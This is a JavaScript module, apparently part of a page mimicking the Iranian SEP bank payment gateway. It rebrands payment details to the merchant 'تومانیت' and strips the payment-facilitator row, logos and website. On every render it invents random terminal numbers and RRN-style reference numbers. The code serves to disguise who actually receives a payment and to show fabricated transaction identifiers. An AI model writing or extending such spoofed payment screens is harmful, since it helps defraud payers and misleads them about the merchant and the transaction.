"use strict";

/** Acceptor / پذیرنده display name on the SEP shell */
const MERCHANT_NAME = "تومانیت";

function randomDigits(length) {
  let n = "";
  for (let i = 0; i < length; i += 1) {
    n += Math.floor(Math.random() * 10);
  }
  return n;
}

/** Fresh random merchant/terminal pair every render. */
function randomMerchantTerminal() {
  return `${randomDigits(8)} / ${randomDigits(8)}`;
}

/** Fresh random reference (RRN-style) every render. */
function randomReference() {
  return randomDigits(12);
}

function isPaymentAssistantLabel(label) {
  return /پرداخت\s*یار/.test(String(label || ""));
}

/** Apply branding: merchant = تومانیت, no پرداخت‌یار row, SEP-like shell. */
function applyMerchantBranding(payment) {
  const terminal = randomMerchantTerminal();
  const reference = randomReference();

  const merchantInfo = (payment.merchantInfo || [])
    .filter((item) => !isPaymentAssistantLabel(item.label))
    .map((item) => {
      const label = item.label || "";
      if (/شماره\s*پذیرنده|ترمینال/.test(label)) {
        return { ...item, value: terminal };
      }
      if (/سایت\s*پذیرنده|ارجاع|مرجع|پیگیری/.test(label)) {
        return { label: "شماره ارجاع", value: reference };
      }
      return item;
    });

  return {
    ...payment,
    merchantName: MERCHANT_NAME,
    merchantLogos: [],
    merchantInfo,
    merchantTerminal: terminal,
    merchantReference: reference,
    merchantWebsite: null,
  };
}

module.exports = {
  MERCHANT_NAME,
  applyMerchantBranding,
  isPaymentAssistantLabel,
  randomMerchantTerminal,
  randomReference,
};
